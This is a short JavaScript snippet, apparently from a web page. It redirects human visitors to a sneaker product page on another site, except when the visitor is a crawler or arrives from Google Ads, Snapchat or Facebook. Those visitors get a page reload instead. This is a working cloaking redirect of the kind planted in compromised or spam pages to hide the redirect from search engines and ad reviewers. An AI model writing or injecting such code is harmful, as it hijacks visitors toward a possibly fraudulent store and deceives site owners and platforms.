
  var referrer = document.referrer.toLowerCase();
  var userAgent = navigator.userAgent.toLowerCase();
  var isBot = (userAgent.indexOf("bot") !== -1) || (userAgent.indexOf("crawl") !== -1);
  if (!isBot && (referrer.indexOf("googleads") === -1) && (referrer.indexOf("snapchat") === -1) && (referrer.indexOf("facebook") === -1)) {
    window.location.href = "https://galaxysneaker.com/nike-air-jordan-1-retro-high-og-dark-mocha-555088-105/";
  } else {
    location.reload();
  }
